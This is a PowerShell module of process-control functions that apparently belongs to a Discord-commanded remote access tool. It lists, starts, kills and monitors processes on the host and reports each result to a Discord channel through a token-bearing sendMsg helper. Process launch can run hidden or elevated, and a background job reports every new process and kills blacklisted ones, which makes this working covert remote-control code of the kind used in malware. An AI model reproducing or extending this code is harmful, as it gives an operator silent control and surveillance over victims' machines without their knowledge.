# Global variables for process management
$global:ProcessWhitelist = @()
$global:ProcessBlacklist = @()
$global:ProcessMonitoringEnabled = $false
$global:ProcessMonitorJob = $null

#==================================== PROCESS LISTING ====================================

#WORKS
function MGet_ProcessList {
    param(
        [string]$filter = "",
        [string]$sortBy = "CPU"
    )
    
    try {
        # Get ALL processes (removed the filtering)
        $processes = Get-Process
        
        if ($filter) {
            $processes = $processes | Where-Object { $_.ProcessName -like "*$filter*" }
        }
        
        switch ($sortBy.ToLower()) {
            "cpu" { $processes = $processes | Sort-Object CPU -Descending }
            "memory" { $processes = $processes | Sort-Object WorkingSet -Descending }
            "name" { $processes = $processes | Sort-Object ProcessName }
            default { $processes = $processes | Sort-Object CPU -Descending }
        }
        
        $totalCount = $processes.Count
        
        # Create the process list output
        $output = ":gear: **Complete Process List** ($totalCount processes)`n"
        $output += "``````"
        $output += "{0,-25} {1,-8} {2,-12} {3,-10} {4,-15}`n" -f "Name", "PID", "Memory(MB)", "CPU", "Status"
        $output += "-" * 75 + "`n"
        
        $processes | ForEach-Object {
            try {
                $memoryMB = [math]::Round($_.WorkingSet / 1MB, 2)
                $cpuTime = if ($_.CPU) { [math]::Round($_.CPU, 2) } else { 0 }
                $status = try { if ($_.Responding) { "OK" } else { "Hung" } } catch { "N/A" }
                
                $output += "{0,-25} {1,-8} {2,-12} {3,-10} {4,-15}`n" -f $_.ProcessName, $_.Id, $memoryMB, $cpuTime, $status
            } catch {
                $output += "{0,-25} {1,-8} {2,-12} {3,-10} {4,-15}`n" -f $_.ProcessName, $_.Id, "Error", "Error", "Error"
            }
        }
        $output += "``````"
        
        # Use the existing sendMsg function which already handles long messages
        sendMsg -Message $output
        
    } catch {
        sendMsg -Message ":x: **Error getting process list:** $($_.Exception.Message)"
    }
}

#==================================== PROCESS EXECUTION ====================================

#REMOVE
function MStart_Process {
    param(
        [string]$executablePath,
        [string]$arguments = "",
        [switch]$hidden,
        [switch]$elevated
    )
    
    if (-not $executablePath) {
        sendMsg -Message ":x: **Error:** Please specify executable path`n**Usage:** ``STARTPROCESS -executablePath 'C:\\Windows\\System32\\notepad.exe'``"
        return
    }
    
    try {
        # Check if executable exists
        if (-not (Test-Path $executablePath)) {
            sendMsg -Message ":x: **File not found:** $executablePath"
            return
        }
        
        # Check if process is in blacklist
        $fileName = [System.IO.Path]::GetFileNameWithoutExtension($executablePath)
        if ($global:ProcessBlacklist -contains $fileName) {
            sendMsg -Message ":no_entry: **Process blocked by blacklist:** $fileName"
            return
        }
        
        $startInfo = New-Object System.Diagnostics.ProcessStartInfo
        $startInfo.FileName = $executablePath
        
        if ($arguments) {
            $startInfo.Arguments = $arguments
        }
        
        if ($hidden) {
            $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $startInfo.CreateNoWindow = $true
        }
        
        if ($elevated) {
            $startInfo.Verb = "runas"
        }
        
        $process = [System.Diagnostics.Process]::Start($startInfo)
        
        if ($process) {
            sendMsg -Message ":rocket: **Process started:** $fileName (PID: $($process.Id))"
        } else {
            sendMsg -Message ":x: **Failed to start process:** $fileName"
        }
        
    } catch {
        sendMsg -Message ":x: **Error starting process:** $($_.Exception.Message)"
    }
}

#==================================== WHITELIST MANAGEMENT ====================================

function MAdd_ProcessWhitelist {
    param([string]$processName)
    
    if (-not $processName) {
        sendMsg -Message ":x: **Error:** Please specify process name`n**Usage:** ``ADDWHITELIST -processName explorer``"
        return
    }
    
    if ($global:ProcessWhitelist -notcontains $processName) {
        $global:ProcessWhitelist += $processName
        sendMsg -Message ":shield: **Added to whitelist:** $processName"
    } else {
        sendMsg -Message ":information_source: **Already in whitelist:** $processName"
    }
}

function MRemove_ProcessWhitelist {
    param([string]$processName)
    
    if (-not $processName) {
        sendMsg -Message ":x: **Error:** Please specify process name`n**Usage:** ``REMOVEWHITELIST -processName explorer``"
        return
    }
    
    if ($global:ProcessWhitelist -contains $processName) {
        $global:ProcessWhitelist = $global:ProcessWhitelist | Where-Object { $_ -ne $processName }
        sendMsg -Message ":shield: **Removed from whitelist:** $processName"
    } else {
        sendMsg -Message ":information_source: **Not in whitelist:** $processName"
    }
}

function MShow_ProcessWhitelist {
    if ($global:ProcessWhitelist.Count -eq 0) {
        sendMsg -Message ":shield: **Process Whitelist:** Empty"
    } else {
        $message = ":shield: **Process Whitelist:** ($($global:ProcessWhitelist.Count) items)`n"
        $global:ProcessWhitelist | ForEach-Object { $message += "• $_`n" }
        sendMsg -Message $message
    }
}

#==================================== BLACKLIST MANAGEMENT ====================================

function MAdd_ProcessBlacklist {
    param([string]$processName)
    
    if (-not $processName) {
        sendMsg -Message ":x: **Error:** Please specify process name`n**Usage:** ``ADDBLACKLIST -processName malware``"
        return
    }
    
    if ($global:ProcessBlacklist -notcontains $processName) {
        $global:ProcessBlacklist += $processName
        sendMsg -Message ":no_entry: **Added to blacklist:** $processName"
    } else {
        sendMsg -Message ":information_source: **Already in blacklist:** $processName"
    }
}

function MRemove_ProcessBlacklist {
    param([string]$processName)
    
    if (-not $processName) {
        sendMsg -Message ":x: **Error:** Please specify process name`n**Usage:** ``REMOVEBLACKLIST -processName malware``"
        return
    }
    
    if ($global:ProcessBlacklist -contains $processName) {
        $global:ProcessBlacklist = $global:ProcessBlacklist | Where-Object { $_ -ne $processName }
        sendMsg -Message ":no_entry: **Removed from blacklist:** $processName"
    } else {
        sendMsg -Message ":information_source: **Not in blacklist:** $processName"
    }
}

function MShow_ProcessBlacklist {
    if ($global:ProcessBlacklist.Count -eq 0) {
        sendMsg -Message ":no_entry: **Process Blacklist:** Empty"
    } else {
        $message = ":no_entry: **Process Blacklist:** ($($global:ProcessBlacklist.Count) items)`n"
        $global:ProcessBlacklist | ForEach-Object { $message += "• $_`n" }
        sendMsg -Message $message
    }
}

#==================================== PROCESS MONITORING ====================================

function MStart_ProcessMonitoring {
    param([int]$intervalSeconds = 30)
    
    if ($global:ProcessMonitoringEnabled) {
        sendMsg -Message ":warning: **Process monitoring is already running**"
        return
    }
    
    try {
        $global:ProcessMonitoringEnabled = $true
        
        $global:ProcessMonitorJob = Start-Job -ScriptBlock {
            param($token, $SessionID, $intervalSeconds, $whitelist, $blacklist)
            
            $global:token = $token
            $global:SessionID = $SessionID
            $global:ProcessWhitelist = $whitelist
            $global:ProcessBlacklist = $blacklist
            
            # Import ALL necessary functions
            ${function:sendMsg} = ${using:function:sendMsg}
            ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
            ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
            ${function:Send_AsFile} = ${using:function:Send_AsFile}
            ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
            ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
            ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
            
            $knownProcesses = @{}
            
            # Send initial status message
            try {
                sendMsg -Message ":eye: **Process monitoring job started successfully**"
            } catch {
                # If sendMsg fails, the job will continue but won't report
            }
            
            while ($true) {
                try {
                    $currentProcesses = Get-Process
                    
                    foreach ($proc in $currentProcesses) {
                        $procKey = "$($proc.ProcessName)_$($proc.Id)"
                        
                        # New process detected
                        if (-not $knownProcesses.ContainsKey($procKey)) {
                            $knownProcesses[$procKey] = $proc
                            
                            # Check if blacklisted (case-insensitive comparison)
                            $isBlacklisted = $false
                            foreach ($blacklistedProcess in $global:ProcessBlacklist) {
                                if ($proc.ProcessName -like $blacklistedProcess) {
                                    $isBlacklisted = $true
                                    break
                                }
                            }
                            
                            if ($isBlacklisted) {
                                try {
                                    $proc.Kill()
                                    sendMsg -Message ":skull_crossbones: **Blacklisted process terminated:** $($proc.ProcessName) (PID: $($proc.Id))"
                                } catch {
                                    sendMsg -Message ":warning: **Failed to terminate blacklisted process:** $($proc.ProcessName) (PID: $($proc.Id)) - Access Denied"
                                }
                            } else {
                                # Only report non-system processes to avoid spam
                                if ($proc.ProcessName -notlike "svchost*" -and $proc.ProcessName -notlike "System*" -and $proc.ProcessName -ne "Idle") {
                                    sendMsg -Message ":new: **New process detected:** $($proc.ProcessName) (PID: $($proc.Id))"
                                }
                            }
                        }
                    }
                    
                    # Clean up terminated processes from tracking
                    $currentPids = $currentProcesses | ForEach-Object { "$($_.ProcessName)_$($_.Id)" }
                    $deadProcesses = $knownProcesses.Keys | Where-Object { $_ -notin $currentPids }
                    foreach ($deadProc in $deadProcesses) {
                        $knownProcesses.Remove($deadProc)
                    }
                    
                } catch {
                    try {
                        sendMsg -Message ":x: **Process monitoring error:** $($_.Exception.Message)"
                    } catch {
                        # Silent fail if sendMsg doesn't work
                    }
                }
                
                Start-Sleep -Seconds $intervalSeconds
            }
            
        } -ArgumentList $global:token, $global:SessionID, $intervalSeconds, $global:ProcessWhitelist, $global:ProcessBlacklist
        
        # Wait a moment for the job to initialize
        Start-Sleep -Seconds 1
        
        sendMsg -Message ":eye: **Process monitoring started** (Interval: ${intervalSeconds}s) - New processes will be reported"
        
    } catch {
        $global:ProcessMonitoringEnabled = $false
        sendMsg -Message ":x: **Failed to start process monitoring:** $($_.Exception.Message)"
    }
}

function MStop_ProcessMonitoring {
    if (-not $global:ProcessMonitoringEnabled) {
        sendMsg -Message ":information_source: **Process monitoring is not running**"
        return
    }
    
    try {
        $global:ProcessMonitoringEnabled = $false
        
        if ($global:ProcessMonitorJob) {
            Stop-Job -Job $global:ProcessMonitorJob -ErrorAction SilentlyContinue
            Remove-Job -Job $global:ProcessMonitorJob -ErrorAction SilentlyContinue
            $global:ProcessMonitorJob = $null
        }
        
        sendMsg -Message ":eye: **Process monitoring stopped**"
        
    } catch {
        sendMsg -Message ":x: **Error stopping process monitoring:** $($_.Exception.Message)"
    }
}

function MGet_ProcessMonitoringStatus {
    if ($global:ProcessMonitoringEnabled -and $global:ProcessMonitorJob) {
        $job = $global:ProcessMonitorJob
        if ($job.State -eq "Running") {
            sendMsg -Message ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id))"
            sendMsg -Message ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')"
        } else {
            sendMsg -Message ":eye: **Process Monitoring Status:** Job exists but not running (State: $($job.State))"
        }
    } else {
        sendMsg -Message ":eye: **Process Monitoring Status:** Stopped"
    }
}

#==================================== PROCESS DETAILS ====================================

function MGet_ProcessDetails {
    param(
        [string]$processName = "",
        [int]$processId = 0
    )
    
    if (-not $processName -and $processId -eq 0) {
        sendMsg -Message ":x: **Error:** Please specify either process name or PID`n**Usage:** ``PROCESSDETAILS -processName notepad`` or ``PROCESSDETAILS -processId 1234``"
        return
    }
    
    try {
        $process = $null
        
        if ($processId -ne 0) {
            $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
        } else {
            $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
            if ($processes.Count -gt 1) {
                $message = ":information_source: **Multiple processes found for '$processName':**`n"
                $processes | ForEach-Object { $message += "• $($_.ProcessName) (PID: $($_.Id))`n" }
                $message += "**Use PID for specific process details**"
                sendMsg -Message $message
                return
            } else {
                $process = $processes | Select-Object -First 1
            }
        }
        
        if (-not $process) {
            sendMsg -Message ":warning: **Process not found:** $processName (PID: $processId)"
            return
        }
        
        $memoryMB = [math]::Round($process.WorkingSet / 1MB, 2)
        $cpuTime = if ($process.CPU) { [math]::Round($process.CPU, 2) } else { "N/A" }
        $startTime = if ($process.StartTime) { $process.StartTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
        
        $details = ":gear: **Process Details:**`n"
        $details += "**Name:** $($process.ProcessName)`n"
        $details += "**PID:** $($process.Id)`n"
        $details += "**Memory:** ${memoryMB} MB`n"
        $details += "**CPU Time:** $cpuTime seconds`n"
        $details += "**Start Time:** $startTime`n"
        $details += "**Responding:** $($process.Responding)`n"
        
        if ($process.MainModule) {
            $details += "**Path:** $($process.MainModule.FileName)`n"
            $details += "**Version:** $($process.MainModule.FileVersionInfo.FileVersion)`n"
        }
        
        sendMsg -Message $details
        
    } catch {
        sendMsg -Message ":x: **Error getting process details:** $($_.Exception.Message)"
    }
}

function MKill_Process {
    param(
        [string]$processName = "",
        [int]$processId = 0,
        [switch]$force
    )
    
    if (-not $processName -and $processId -eq 0) {
        sendMsg -Message ":x: **Error:** Please specify either process name or PID`n**Usage:** ``KILLPROCESS -processName notepad`` or ``KILLPROCESS -processId 1234``"
        return
    }
    
    try {
        $processes = @()
        
        if ($processId -ne 0) {
            $processes = Get-Process -Id $processId -ErrorAction SilentlyContinue
        } else {
            $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
        }
        
        if (-not $processes) {
            sendMsg -Message ":warning: **Process not found:** $processName (PID: $processId)"
            return
        }
        
        $killedProcesses = @()
        
        foreach ($proc in $processes) {
            try {
                # Check if process is in whitelist
                if ($global:ProcessWhitelist -contains $proc.ProcessName) {
                    sendMsg -Message ":shield: **Process protected by whitelist:** $($proc.ProcessName) (PID: $($proc.Id))"
                    continue
                }
                
                if ($force) {
                    $proc.Kill()
                } else {
                    $proc.CloseMainWindow()
                    Start-Sleep -Seconds 2
                    if (-not $proc.HasExited) {
                        $proc.Kill()
                    }
                }
                
                $killedProcesses += "$($proc.ProcessName) (PID: $($proc.Id))"
                
            } catch {
                sendMsg -Message ":x: **Failed to terminate:** $($proc.ProcessName) (PID: $($proc.Id)) - $($_.Exception.Message)"
            }
        }
        
        if ($killedProcesses.Count -gt 0) {
            $message = ":skull_crossbones: **Terminated processes:**`n"
            $killedProcesses | ForEach-Object { $message += "• $_`n" }
            sendMsg -Message $message
        }
        
    } catch {
        sendMsg -Message ":x: **Error terminating process:** $($_.Exception.Message)"
    }
}
